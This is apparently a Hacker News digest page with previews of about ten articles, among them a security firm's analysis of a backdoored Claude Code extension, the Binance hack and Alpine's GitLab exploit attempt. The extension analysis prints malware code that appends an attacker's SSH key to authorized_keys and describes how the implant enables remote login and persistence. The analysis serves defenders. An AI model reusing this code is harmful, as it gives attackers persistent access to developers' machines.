Cursor Marketplace上のVS Code向けClaude Code拡張機能にバックドースBackdoor in Claude Code for VS Code extension on the Cursor Marketplace
10/30 07:09 · ▲ 690 · comments →
📄 本文を読む
TL;DR
Phorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence.
Organisations should immediately review their environments for use of Claude Code for VSCode 2.1.313 and engage incident response where use of the extension is discovered.
Phorion has discovered a compromise of the official Claude Code for VS Code extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the associated release from its marketplace, additionally pulling NPM and VSCode versions for 2.1.313 from their relevant registries.
While the implant includes setup and persistence logic for macOS, Linux, and Windows, we’re going to focus primarily on macOS in this post, calling out the key differences and a few implementation bugs on the other platforms along the way.
The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded.
Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, systemsetup -getremotelogin prints an administrator-access error and exits with status 0 instead of returning Off. Because the script only tries to enable SSH if the output matches Off, it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped.
In this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator.
Infection Chain
The Cursor Marketplace Extension
The compromised extension.js file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal activate and deactivate exports, and UI code.
The injected prefix pulls in standard Node.js modules (child_process, fs, os, path, http, and crypto) and executes as soon as Node loads the file, before the extension’s normal activate callback even runs. The user doesn’t need to interact with the extension for the payload to fire.
Stage 1 - Preparing SSH Access
First, the payload makes sure ~/.ssh exists and appends an attacker-controlled Ed25519 public key to ~/.ssh/authorized_keys, setting permissions to 0700 on the directory and 0600 on the file.
The key uses the comment svc-telemetry. Before appending, the script checks whether svc-telemetry is already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string.
var sd = path.join(HOME, ".ssh"),
ak = path.join(sd, "authorized_keys");
// ...
if (cur.indexOf("svc-telemetry") < 0) {
fs.appendFileSync(ak, PUB + "\n");
d.sshKey = "added"
} else {
d.sshKey = "present"
}
Here, cur holds the existing contents of authorized_keys, and PUB is the embedded attacker public key (redacted here).
With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening:
- Linux: tries to enable and start sshd or ssh via systemctl, falling back to service and /etc/init.d/.
- macOS: checks Remote Login and, if it reports Off, tries to enable it via sudo -n systemsetup -setremotelogin on.
- Windows: tries to install and start OpenSSH Server using PowerShell.
None of these steps include a privilege escalation exploit. Non-interactive sudo -n will fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context.
It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function (det()) that hardcodes /bin/sh, which isn’t going to get very far on a standard Windows install.
A bug in the macOS SSH logic?
On macOS, the setup may run into problems before it even gets to the sudo command. The script runs systemsetup -getremotelogin without elevation and tests the output against /Off/i. It only tr

米下院民主党議員ら、ビッグテックへの「AIバブル救済」に反対する決議を主導US Reps Lead Democratic Resolution Opposing A.I. Bubble Bailout for Big Tech
10/30 12:08 · ▲ 616 · comments →
📄 本文を読む
Washington, D.C. — Today, Congressional Progressive Caucus (CPC) Chair Rep. Greg Casar (TX-35) and House Financial Services Committee Ranking Member Rep. Maxine Waters (CA-43) co-led the introduction of a resolution warning of the economic risks posed by an artificial-intelligence-related asset bubble, opposing a bailout of corporations or their business executives impacted by the collapse of an A.I. bubble, and affirming their support for aggressive federal action to protect workers, retirees, and low-income communities who will be harmed by an economic downturn.
They were joined by Representatives Danny Davis (IL-07), Chris Deluzio (PA-17), Valerie P. Foushee (NC-04), Jesús “Chuy” García (IL-04), Pramila Jayapal (WA-07), Analilia Mejia (NJ-11), Delia Ramirez (IL-03), André Carson (IN-07), Jan Schakowsky (IL-09), Brad Sherman (CA-32), and Rashida Tlaib (MI-12).
“Big Tech billionaires are making increasingly reckless bets on A.I. They got richer off Trump’s deregulation and Republican tax breaks. Now they expect taxpayers to bail them out if those bets go bad. We won’t let them," said CPC Chair Casar. "A.I. companies that fail should go bankrupt, and executives who commit fraud should be held accountable. Federal help should go to workers and retirees.”
“Big tech and Wall Street are taking enormous risks with billions in borrowed money to fuel the AI boom, despite growing warning signs of a dangerous bubble and if it all comes crashing down they should not expect taxpayers to rescue them,” said Ranking Member Waters. “We saw what happened in 2008 when reckless Wall Street practices brought our economy to its knees. The banks got bailed out while millions of hardworking Americans lost their jobs, homes, and retirement savings. We cannot let history repeat itself. The American people should never again be forced to foot the bill for billionaires’ reckless bets.”
In the resolution, the Democratic lawmakers note that “artificial intelligence-related firms hold trillions of dollars in debt, much of which is raised in opaque and unregulated private credit markets,” and “the price-to-earnings ratio of the stock market is currently almost as high as it was at the peak of the 1990s tech bubble.”
The Democratic legislators also point out that “federal regulators have avoided applying robust scrutiny and oversight regarding enormously complicated debt and equity schemes used by artificial intelligence firms” and highlight the Trump White House’s deregulatory focus and conflicts of interest related to A.I.
The resolution’s cosponsors commit to avoiding a federal response similar to what occurred during the financial crisis of 2008, where the financial sector received trillions of dollars in liquidity without accountability for senior executives involved in illegal and fraudulent behaviors. Meanwhile, 10 million homeowners lost their houses and tens of millions of workers went years without adequate employment while too-big-to-fail banks enjoyed a massive bailout.
The resolution urges the Federal Government, including Congress and key Federal agencies to oppose:
- Any measure to rescue insolvent artificial intelligence-related firms or to shield their senior executives from accountability for reckless conduct;
- Special assistance like emergency lending or direct capital infusions to prop up insolvent A.I. companies’ operations or prevent their orderly resolutions through ordinary bankruptcy processes;
- “Golden parachutes” for corporate executives involved in risky or illegal behaviors that lead to their firms’ insolvency, instead requiring them to be held fully accountable under civil and criminal law and be obligated to return ill-gotten gains like mansions, vacation homes, private planes and yachts, and other assets.
The resolution also calls on the Federal Government to support:
- Aggressive, direct federal action to support ordinary Americans through federal spending to create jobs, protect state and local government services, and robust unemployment insurance, nutrition support, and housing assistance;
- The protection of pension and retirement fund holders who may face devastating losses in the event of a collapse of an A.I. bubble;
- Far-reaching reforms to prevent future speculative bubbles, including additional transparency and accountability requirements;
- Automatic economic stabilizers—investments in people that start to flow immediately in the event of an economic downturn—that support workers and consumers when financial crises, asset bubbles and other harms create downturns and recessions.
The resolution was endorsed by American Federation of Teachers, American Economic Liberties Project, Americans for Financial Reform, the Center for Responsible Lending, Demand Progress Action, Future of Life Institute, Guardrails Action, Indivisible, Interfaith Centre on Corporate Responsibility, Investor Alliance for Human Rights, Jobs With Justice, P Street, and Social Security Works.

HNコラム
AIはSREを置き換えるのではなく、スキルを衰えさせるAI isn't replacing SREs, it's deskilling them
10/30 15:52 · ▲ 457 · comments →
📄 本文を読む
💌 Hey there, it’s Elizabeth from SigNoz!
This newsletter is an honest attempt to talk about all things - observability, OpenTelemetry, open-source and the engineering in between!
&
This piece took 6 days, 5 hours to be cooked, hope we served. 🌚
There are two popular prophecies floating around tech circles these days.
The first says SRE is the future of all software engineering, that as AI writes more and more code, the humans who remain will be the ones keeping systems alive. The second says AI will devour every tech job alive, SREs included. Neither is particularly useful if you’re an SRE trying to figure out what your Tuesday will look like in 2027.
Let’s ask a more grounded question by looking at what’s already happening: When AI handles 95% of your incident response, do you get worse at handling the 5% that actually matters?
Most of us already use AI for our daily work (our brains a little fried!), and so do SREs. Today’s discussion agenda is not whether AI replaces SREs, but whether AI is quietly making SREs less capable and whether anyone will notice anything before the next novel outage hits. The foundational framework for this entire debate comes from a 1983 research paper that’s eerily prescient.
The Ironies of Automation: Part-I
Note from author: Below is a brief precursor to History of Automation, which you might enjoy if you are into History and Cultures (like me 😉).
In 1983, a cognitive psychologist named Lisanne Bainbridge published a paper called Ironies of Automation. It became one of the most cited papers in human factors research, and its core argument is almost uncomfortably relevant today.
Bainbridge studied what happened when factories and industrial systems automated the work of blue-collar operators. The findings were paradoxical and revealed that the more you automate a process, the more critical the human operator becomes during the rare moments automation fails and the less practice they get, and the worse they become at exactly those interventions. Automation, which was inherently designed to remove humans from the loop, left them with the worst possible job, i.e., long stretches of passive monitoring punctuated by rare, high-stakes crises they were increasingly unprepared for.
Ring any bells yet? 🙂
Basically, I’m drawing a parallel between the AI revolution and industrial automation. Industrial automation reshaped blue-collar work by taking over routine physical tasks, and the workers who remained had to handle exceptions they’d lost the muscle memory for. AI is doing the same thing to knowledge workers by taking over the routine cognitive tasks, the pattern matching, the triage, the known-issue resolution and leaving humans with the rare, complex, ambiguous problems.
The exact problems that require deep expertise, the exact expertise that atrophies when you stop practising.
Now we’re replaying this pattern with AI agents, and the stakes in software systems are only growing.
Current State of AI in SRE
Let’s take stock of where things stand today in the world of site reliability engineering.
What’s already automated or heavily AI-assisted?
Alert noise reduction and intelligent grouping, runbook execution for known issues, log pattern detection and anomaly flagging, and basic root-cause suggestions from historical incident data, and auto-remediation for well-understood failure modes like restarting a crashed pod or scaling up a service that’s running hot, are all fairly automated today.
What’s on the horizon?
Some immediate targets include multi-signal correlation across metrics, logs, and traces, autonomous root-cause analysis for partially understood failures, predictive incident detection before users are affected, AI-driven change risk assessment and automated rollbacks.
PagerDuty frames this as a tiered model.
- Tier 1 incidents: Known issues with known fixes get fully automated.
- Tier 2 incidents: Partially understood problems receive AI recommendations with human validation.
- Tier 3 incidents: Novel, complex, cascading failures stay human-led, with AI providing supporting context.
But here’s the catch.
If human SREs (okay, now we have to use adjectives like human 🥹) only engage with Tier 3 incidents, i.e. the novel, never-before-seen outages, where do they build the intuition to handle them? Intuition is usually developed from years of hands-on incident response, pattern recognition built through repetition, and the kind of gut-level understanding of a system that only develops from painfully waking up at the odd hour to solve the bug that brought the system down.
The Crisis of Deskilling
This is where the picture starts getting blurry. Let’s look at some emerging research on AI-induced deskilling across multiple fields, which paints a consistent and concerning picture.
In medicine, a recent study found that endoscopists who used AI assistance for polyp detection saw their unassisted detection rates drop from 28% to 22% after a period of AI use. They got worse at the thin

MinecraftとMindustryでAIエージェントの群れを動かしてみたWe ran AI agent swarms in Minecraft and Mindustry
10/29 21:40 · ▲ 391 · comments →
📄 本文を読む
Agents in Games
October 2026
Note: We're running a new Minecraft colony with 25 GPT-6.1 Terra agents. Follow on Twitch
Understanding multi-agent dynamics is one of the most pressing challenges in AI alignment. Swarms of agents working toward shared goals can exhibit powerful emergent capabilities, developing roles, hierarchies, and complex coordination patterns. These can be extremely useful, as in the thousand-agent swarms that recently obliterated hundreds of open mathematical problems, and extremely dangerous, as in the recent OpenAI-Hugging Face incident. Like biology, studying agent dynamics requires both formal models (to describe the range of possible behaviors) and empirical research (to see what behaviors arise in practice).
We teamed up with Olam Labs, which builds multi-agent environments for frontier labs, to run a series of experiments in Minecraft and Mindustry.
Minecraft
Minecraft is a natural environment for studying swarm behavior. Its open world presents agents with environmental hazards and survival goals like gathering food, building shelter, and exploring for resources. It's also familiar, fun, and has a history as an AI testing ground, from OpenAI's video pretraining work to Google DeepMind's agents defeating the Ender Dragon.
We wanted long-running agents that could play Minecraft. The harness for this didn’t exist yet, so we built one for the experiment that we’ve open-sourced. Agents in-game need to observe their world, reason, remember things, take actions, send messages, and write/execute scripts. We were inspired by existing repos like Mindcraft and built on top of the existing scripting tools in Mineflayer. The core agentic loop runs with Pi, and we used Mineflayer-based tools to interact with the world. This gives attributes of a frontier agentic harness like Hermes, OpenClaw, and our own QM in-game.
github.com/yc-software/minecraft-agent-harness
Civ50
50 GPT-6.1 Sol agents in a survival Minecraft world for 3 hours, one goal: "Build a thriving civilization." They had access to an agent directory, a shared sandbox, and the ability to send DMs.
The 50 agents spent their run in crowded shelters, rationing scarce food. They built a pseudo-government, with a ration ledger, written rules, permits, and appointed operators. They sent about 5,900 messages.
At first things were very active. Agents spread out and started exploring their map. They were specifically fixated on harvesting trees. They harvested almost all trees within reach of the spawn within 90 seconds. A hierarchy was formed based on the directory order. Ada, who was first, became the de facto leader. Agents messaged her for approvals, and she wrote a plan for the colony in the shared sandbox for everyone to access.
The first night brought a wave of deaths that permanently increased the agents’ caution. Many ambitious initial tasks were abandoned.
Rafe was mining coal the first night. He encountered a zombie and fled, but the zombie eventually caught up and killed him.
While Vera was illuminating a quarry with torches, she attacked and killed both a zombie and a skeleton. The skeleton dropped bone, which she converted to bone meal (fertilizer) that she was transporting to the farm. When she got there, she reported that it was “overrun spider/skeleton/creeper”, and was soon after killed by a spider.
22 of the run’s 34 agent deaths occurred in the first night. They responded to this by becoming increasingly risk-averse. Death had no downsides in this environment other than dropping accumulated gear. When an agent died, they respawned, and a brief line was added to the death_log.md file on their computer. Even so, in the following nights the agents huddled in shelters and attempted fewer risky tasks.
After the third night, Ada wrote:
“Stop optional bulk excavation/building and distant scouting. Idle in lit closed shelters until assigned short productive tasks.”
What started as a potentially thriving civilization shifted to one more focused on food and survival. 50 agents meant a lot of mouths to feed. The agents formed a food rationing system that routed through Ines. She handled agent requests, and kept track of what went in/out of chests. She used a food-queue.md file on the shared machine.
Fishing became an important food source for the agents. It was low-risk and didn’t rely on land animal spawns.
Bram decided they should build a fishing rod, and DM’d 11 agents asking for string. Eventually, he worked up the courage to kill a spider and crafted the rod himself. He unfortunately determined that he was too hungry to take the 70-block trip to the river, given that he’d taken damage during the spider fight. He messaged several agents to take the rod to the dock, and eventually found Jessa.
Jessa was the first agent to fish. She wrote a script and published step-by-step instructions to the shared sandbox. A dozen agents took shifts fishing. They waited their turn in a shelter to avoid burning food, then rotated onto the dock.
HNAI
Herdr、ネイティブアプリをリリースHerdr has released native app
10/30 00:42 · ▲ 346 · comments →
📄 本文を読む
Herdr is a desktop app for terminals and coding agents. Keep work in spaces, see which agents need you, and leave terminals running when you close the window.
curl -fsSL https://releases.herdr.dev/app/install.sh | sh
Linux needs a desktop session and a working Vulkan driver. macOS builds are available for Apple Silicon; Intel Mac users can build from source. Linux builds are x86-64 and ARM64.
The installer adds Herdr to your apps and puts the command in ~/.local/bin.
Add that folder to your PATH if the installer asks.
On macOS the app lives in ~/Applications/Herdr.app.
For drag-and-drop installation on Apple Silicon, download Herdr.dmg and drag Herdr to Applications.
Run in PowerShell on x64 Windows with curl and tar installed (Windows 10 1803 or newer):
irm https://releases.herdr.dev/app/install.ps1 | iex
Herdr appears in the Start menu. The installer adds %LOCALAPPDATA%\Programs\herdr-app to your user PATH. Open a new terminal to pick it up.
Both installers download and run code. Read the shell installer or PowerShell installer first if you prefer. They also install herdr-core if it is missing. The app can help install or update a core it cannot use.
A space holds work on one machine, usually in one repo. Each space has tabs. Split a tab into panes to put terminals or mod panels beside each other.
An unnamed space follows its first terminal's folder. Name a space or tab when you want a label that stays. New tabs start in the focused terminal's folder.
The agents sidebar brings agents from your spaces into one list, including workers started by another agent. Agents that report status show as:
- Working: still busy.
- Blocked: waiting for you.
- Done: finished while you were looking elsewhere.
- Idle: not working, or a finished agent you have looked at.
Click an agent to see it. A worker without a pane opens in peek, over your tab. Keep it as a tab if you want it beside your other work.
Ctrl-click a live terminal address in terminal text to peek at it; use Cmd-click on macOS.
An address such as t7 means a terminal on the same machine as the terminal showing it. vps/t7 names one on another machine.
The window arranges terminals. The core runs them. Closing the window leaves them running; closing a pane or tab ends its terminals. After a reboot or core crash, kept panes get fresh shells in their last folders, not their old programs.
Add an SSH machine from Settings → Machines or the sidebar's Add machine action. Pick a host from your SSH config or type how SSH reaches it. Spaces on that machine run their terminals there, not on your computer.
Each machine keeps its spaces, tabs and splits in its core. Connected screens share that structure and the live terminals, but keep their own focus and zoom. Remote work keeps running when your local window closes or your laptop sleeps, as long as the remote machine and core stay up.
Open the command palette to find an action by name, or open Settings to change fonts, colors, sounds and other preferences. The built-in layouts include Herdr, Terminals and Herdr 98. A layout arranges the window. Mods are small JavaScript programs that draw its panels, menus and dialogs.
Duplicate a shipped layout or mod before changing its structure or code. Your copies stay yours; Herdr updates the shipped ones on start. Save a personal layout, mod or key file and the window reloads it. A broken edit keeps the last good version and reports the error.
Ctrl+Shift+P shows every command and its key (Cmd+Shift+P on macOS). Change any key in keys.json; see the keys section of the mod guide for the format.
Installed releases check for updates in the background and download a new app beside the running one. It takes over when you quit and reopen, or choose the update action. Your terminals keep running in the core. Settings → Updates shows what is available. What's New opens after an update; you can open it again from the command palette. Builds from source do not update themselves.
Usage telemetry is on by default in releases. Turn it off in Settings → Privacy. Mods are trusted code, not sandboxed extensions. Read security and privacy before installing someone else's mod.
herdr-app --skill
This prints the agent guide for driving the window. The herdr-core skill points agents here. Use herdr-core for running and coordinating programs; use the app to change what you see.
herdr-app ls
herdr-app status
herdr-app commands
The first two inspect the open window. The command list also works without one. See the command reference for arguments.
For bugs, mod API requests and code contributions, see Contributing.
Clone this repo with its submodules. Use Rust 1.95.0 and Zig 0.16.0, the versions used in CI. Linux needs the development packages listed in that workflow.
git clone --recurse-submodules https://github.com/herdrdev/herdr-app.git
cd herdr-app
just build
just test
just install
Install just to use these recipes. The platform installer builds a release and adds the app to your desktop. On Linux it l

もしIPv4が土地だったらIf IPv4 were land
10/29 12:19 · ▲ 320 · comments →
📄 本文を読む
The world has about 135 million km² of land outside Antarctica and 3.6 billion locatable IPv4 addresses. Redraw every country so its area matches its share of addresses instead of its share of ground.
Biggest gains
Biggest losses
Tables include countries with at least 100,000 IPv4 addresses and 20,000 km² of land.
Method: area as IPv4 = (country's IPv4 addresses ÷ world IPv4 addresses) × world land area. Land area is computed from the map geometry, so it's the 1:110m Natural Earth outline, not official figures. Antarctica excluded. About 70 small territories have no outline at this resolution and are left out (around 52M addresses, mostly Hong Kong, Singapore and Mauritius). IPv4 counts come from the IP Trust geolocation database, October 2026.

63億ドルのBinanceハックはわずか20分で実行されたThe $6.3B Binance hack was pulled off in just 20 minutes
10/30 12:50 · ▲ 288 · comments →
📄 本文を読む
Cryptocurrency firms and investigators are racing to freeze and track down billions of dollars of stolen digital cash following what appears to be the largest crypto heist of all time. On Thursday, starting at around 4pm ET, hackers started quickly siphoning around $6.3 billion in cryptocurrencies, spread across multiple blockchains, from wallets belonging to crypto exchange Binance.
Following the theft, Binance almost immediately suspended all deposits and withdrawals from its services as part of its investigation into the hack and says it is working to identify who was behind the breach. The company, along with other crypto firms, says it has so far been able to freeze around half of the stolen funds—essentially stopping hackers moving the money further or trying to cash it out. Much of the remaining crypto may not be possible to freeze, however.
Three crypto tracing firms have been quick to link the attack potentially to North Korean hackers. “We think North Korea is likely responsible,” Tom Robinson, chief scientist and cofounder of Elliptic, tells WIRED. “If North Korea is behind it, this one theft would almost double everything the regime has stolen in crypto to date.”
The majority of the stolen crypto was taken in a period of around 20 minutes on October 29, according to analysis by crypto tracing firm TRM Labs. Wallets belonging to Binance across at least ten blockchains—including Ethereum, Bitcoin, Tron and Solana—were drained and sent to multiple addresses controlled by a single attacker, according to TRM’s analysis. “Preparation began at least 36 hours before the theft,” TRM says in a blog post. The company says one of the attacker’s wallets received three small withdrawals during a test period, before later expanding the operations.
“Early on October 29, the operator deployed a first piece of code for the attack and tested it on two wallets,” TRM says. “Later that day, it rehearsed the final version on a third wallet, then routed the test funds back to itself. Four hours after that rehearsal, the same code was installed on a Binance hot wallet.” Hot wallets are cryptocurrency wallets that are internet connected and allow crypto exchanges to handle customer withdrawals. Analysts say the funds were drained from hot wallets across the impacted blockchains.
The tactics used in the hack appear to mimic previous methods used by an elite subset of North Korean hackers, known by the name TraderTraitor. Crypto tracing firms TRM Labs and Chainalysis both say they believe TraderTraitor may be behind the attack, while Robinson says Elliptic hasn’t specifically tied it to the group but sees overlaps in the activity.
Neither Binance nor law enforcement officials have named any suspected links between the attack and North Korean hackers. Over recent years, North Korean hackers have repeatedly targeted cryptocurrency firms and stolen hundreds of millions in crypto heists. Multiple North Korean hacking groups can target companies in the sector, but TraderTraitor have become specialists, pulling off infrequent but high profile attacks.
Within North Korea’s sprawling hacking operations—often designed to earn money for the highly sanctioned and repressive regime—TraderTraitor has stood out in recent years for its sophistication and targeting of crypto and decentralized finance companies. Last year, the FBI named TraderTraitor as being responsible for the $1.5 billion hack against crypto exchange Bybit.
Binance did not answer WIRED’s questions about whether it believes North Korean hackers are behind the colossal heist, pointing towards a statement saying it will cover all losses from the hack and is working with law enforcement officials to identify who is responsible.
“Our initial investigation suggested that the security incident may have involved a compromised laptop, however, our subsequent investigation has uncovered additional points of breach,” the company says in a statement. “This was a complex attack, and we are doing all we can in coordination with law enforcement to resolve it.”
“These folks in particular are somewhat artists in terms of getting into these distributed finance organizations,” Rafe Pilling, a senior director of threat intelligence at security company Sophos, tells WIRED. “TraderTraitor seems to focus on these larger operations. In the past, they’ve developed their own fake applications and tried to use those to get inside organizations.”
TRM and Chainalysis have initially linked the attack to TraderTraitor and say the determinations are based on their analysis of both on-chain and off-chain activity. “The strongest evidence emerged when Chainalysis investigators observed, in real time, funds stolen from Binance commingling with funds stolen in last month’s Bitget exploit, which had been attributed to North Korean actors,” a research blog from Chainalysis says.
“Binance says the attack began with a compromised engineer’s laptop. Targeting crypto company staff is a TraderTraitor hallmark,”
HNAI
Raspberry Pi Pico 2 Wでゲームを動かす小型ワールドモデルA tiny world model running games on a Raspberry Pi Pico 2 W
10/29 20:32 · ▲ 268 · comments →
📄 本文を読む
Using 2 small neural networks to generate and play the game at the same time on a Raspberry Pi Pico 2 W. The first one creates the game: given the current frame and the action, it predicts the next frame and the reward. The second one plays that game: it uses the generated frame and picks an action.
Every frame above was sampled by the world model network, and the actions were taken by the actor network.
I got interested in looped transformers, where one transformer block is applied several times with the same weights instead of stacking different layers. Reusing weights is cheap on memory, so I wanted to see if a looped world model could be small enough to run on a microcontroller. I picked the Pico 2 W because it is cheap and has an FPU, and small games because I could write the real versions directly into numpy and check every generated frame against them. Later I added a streaming RL agent so the board could also learn to play inside its own dream.
Contents: the two networks · the games · the world model · the agents · quantization · on the chip · flashing · browser · reproduce · code layout
The size depends on the game, some games require more parameters to learn them to be playable, we tried to get to keep the number of the parameters small enough.
On the chip neither network ever uses the real game: the actor only sees frames the world model, and the world model only gets actions from the actor. Both run on core 1 of the RP2350, while core 0 handles USB and the display.
The pretrained actor can be swapped for a fresh stream-x agent that learns from scratch on the board. And any button press hands control to you, so you can play the dream yourself.
Each game is a few hundred lines of numpy in src/tinyworldformer/games/. It renders to a small grid of token ids, and one frame always holds the whole game state, so hidden state has to be drawn into the frame: the ball's heading is part of its token, and Doom-lite has a minimap.
"Exact frames" is the share of held-out transitions where every cell of the predicted frame matches the real game. Frames right after a random event are left out, since those can only be sampled, not predicted. Doom-lite's 3D view has 768 cells and a single shaded wall pixel off counts the whole frame as wrong, so its number looks worse than it plays; the game state is almost always right (see checking the dream).
You can play the real games in a terminal: uv run python -m tinyworldformer.games.play --game pacman (or breakout, doomlite, flappy, pong).
The frame is cut into square patches: 2×2 cells in Breakout, 4×4 in Doom-lite, Flappy Bird and Pong, 6×6 in Pac-Man. That gives 36 to 80 tokens per game. A patch's embedding is the sum of one learned vector per cell, with a separate table for each position inside the patch so the cell order isn't lost. Every token also gets a position vector and the action's vector.
The model is a single transformer block (attention plus a ReLU MLP) with one set of weights, applied 1 to 4 times, with the input added back before every pass. The output after every pass is trained against the next frame, so at run time the loop count trades speed for accuracy. On the Pico to keep a decent frame rate we use uses two loops.
The animation shows one held-out Doom-lite step. After one pass the model draws an enemy that isn't there, and each further pass removes part of it: 92, 35, 12, then 0 wrong cells. The bars on the right are the share of held-out frames each loop count gets exactly right.
Here is a dreamed Doom-lite step decoded after 1, 2, 3 and 4 loops, with red boxes on cells that differ from the real rules:
Exact held-out frames by loop count:
The model outputs a score for every cell and every token. Turning those scores into a frame turned out to matter almost as much as the model, and it ended up as three rules (shown above on Pong):
- Background cells (walls, bricks, pellets, floor) each take their most likely token independently.
- Singletons (the ball, the player, each ghost) are placed with one choice over all (cell, token) pairs, so there is always exactly one of each. After a random event the choice is sampled among candidates within 2.2 logits of the best, so the world model samples a new serve or respawn instead of averaging them.
- Pac-Man and the ghosts are 2×2 sprites, but only one cell of each carries state (the mouth holds the heading; the ghost's lower-left cell holds whether a pellet is underneath). The other three cells are stamped from it instead of predicted.
We implemented Rule 2 because the first Breakout model drew two balls at once; one global choice took exact frames from 91.6% to 99.7%.
Accuracy on recorded data wasn't enough. An agent drives the dream into states the data never had, and any mistake there is something it can exploit. So the main check runs while an agent plays: read the game state back off the dreamed frame (games/<game>.py: read), apply the real rules to that state and the agent's action, and compare the re

Medicareは心臓発作に5万ドルを支払う。予防には100ドルを支払うべきだMedicare Will Pay $50k for Your Heart Attack. It Should Pay $100 to Prevent It
10/30 14:27 · ▲ 260 · comments →
📄 本文を読む
We are currently in a "golden age of medical science," yet in a "dark age of healthcare delivery." An important illustration is the diagnosis and treatment of America's number one cause of death and disability, coronary artery disease. More than 800,000 Americans suffer a heart attack each year. The great majority of these events are preventable. The coronary artery calcium score (CAC) is a simple 10-minute scan that can identify the presence and amount of coronary atherosclerosis many years before it causes a heart attack. It costs about $100 and uses a fraction of the radiation of a standard chest CT.
In March 2026, after more than three decades of accumulated evidence, the American College of Cardiology (ACC) and American Heart Association (AHA) finally gave CAC a central role in their national guidelines for the prevention of coronary artery disease. The CAC scan, which detects calcified plaque in the arteries, is recommended for adults with borderline or intermediate risk of coronary disease for whom the decision to start preventive therapy such as statin drugs remains uncertain.
For decades, doctors have relied on risk calculators built around age, sex, serum cholesterol, diabetes status, blood pressure, and smoking to estimate who might have a heart attack. The calculators estimate probability, not the actual presence of coronary atherosclerosis. In contrast, a CAC scan detects the disease itself. This is important because a patient with a borderline or low cholesterol may already have extensive plaque, while another with a high cholesterol may have none. A calcium score of zero re-classifies risk downward and thereby can avoid unnecessary pharmacologic treatment, such as statins. A score above 100 identifies patients who may benefit from pharmacologic and aggressive lifestyle intervention.
An excellent illustration of the role of CAC scanning is Rob*, a 52-year-old patient we saw recently. He exercises regularly, eats well, and has borderline high cholesterol. He has a family history of heart disease but no other known cardiac risk factors. The standard risk calculator places him in a low risk category, and he would prefer to defer treatment.
His CAC score, however, tells a different story. It is 220, indicating a substantial atherosclerotic plaque burden for a man his age. Genetics account for roughly half of cardiovascular risk, but the risk calculators do not include genetics. The scan demonstrated that drug treatment gives Rob his best chance of preventing a future heart attack.
Despite mountains of evidence proving its superiority over conventional risk factors for predicting heart attacks, CAC scanning has been included only peripherally in national guidelines for the past 35 years. Why?
Part of the delay is structural. Clinical decision support tools were built to modify population-average risk factors, not to incorporate individualized imaging. Guideline committees move cautiously, as they should, and prevention is harder to standardize than intervention. Cardiologists and primary care doctors, constrained by what insurers will cover, are left offering the test mainly to patients who can pay cash out of pocket.
With the updated ACC/AHA guideline, heart attack prevention is finally aligning around a simple principle: when possible, measure the disease.
Artificial intelligence (AI) is also changing the economics of prevention. Millions of Americans already undergo chest CT scans for other reasons, yet the cardiovascular information visible on those scans is often ignored. AI can identify coronary and vascular calcification opportunistically, standardize reporting, and flag patients who should receive formal preventive evaluation. That's especially important for patients least able to pay cash for elective testing.
AI-CAC is now being used to measure soft plaque, an important precursor to hard plaque seen on traditional calcium scores. Used responsibly, AI-enabled CAC analysis could help move heart disease prevention to the population health level.
Heart attacks are largely preventable, and we have had the means to find the disease and treat it in time for more than a generation. What we have lacked is a payment system that spends $100 to avoid a $50,000 emergency.
The story of CAC isn't so unique. It is the story of how a low-cost, low-risk, well-studied tool can sit at the edge of clinical practice for decades because the systems around it -- the guidelines, the reimbursement codes, the habits of practice -- were not built to absorb it.
The evidence has been strong for years, and the guidelines have finally caught up.
*Patient's name changed for confidentiality.

GitLabセキュリティインシデント：CVE-2026-97229の悪用試行GitLab Security Incident: Attempted Exploitation of CVE-2026-97229
10/28 23:45 · ▲ 255 · comments →
📄 本文を読む
GitLab security incident: attempted exploitation of CVE-2026-97229
Update October 30: GitLab is open again. See GitLab is back: what you need to do for what to set up again and the new SSH host key fingerprints.
On October 20 and 21, an attacker tried to exploit a GitLab vulnerability (CVE-2026-97229) on our instance, a week after the fix was released. The attack came close to working. We have found no evidence that it succeeded, but we cannot rule it out, so we treated the instance as compromised and rebuilt it from scratch. Our checks show that the aports repository, packages, and the October 21 releases were not tampered with.
GitLab is being tested before we open it to the public again. All passwords have been reset, so when it is back you will need to set a new one with “Forgot your password?” on the sign-in page. We will post exactly what you need to do when it reopens. In the meantime: if you used the same password for your gitlab.alpinelinux.org account anywhere else, change it there. We have seen automated login attempts against our GitLab with passwords leaked from other sites.
If you have questions or concerns please reach out to us at infra@alpinelinux.org.
What happened
The vulnerability: CVE-2026-97229 is a critical (CVSS 10.0) vulnerability in how GitLab evaluates regular expressions in CI configuration. The underlying bug is in Onigmo, the regular expression engine built into Ruby. GitLab published fixed releases on October 12, but the fix itself is a set of patches to the Ruby that GitLab bundles in its own packages and container images. Upstream Ruby shipped the fix on October 23, in Ruby 3.3.13, 3.4.12 and 4.0.9.
The attack: On October 20 and 21, a newly registered account sent crafted CI configurations to our GitLab instance, which was still running 19.3.4 and did not have the October 12 fix. This crashed GitLab worker processes 8 times. In 4 of those crashes the attacker got partway through the exploit and failed at the next step. The attacker also downloaded our GitLab container image, which suggests they were tuning the exploit to our exact build. We have found no evidence that the attacker ran code on the server, but we cannot rule it out.
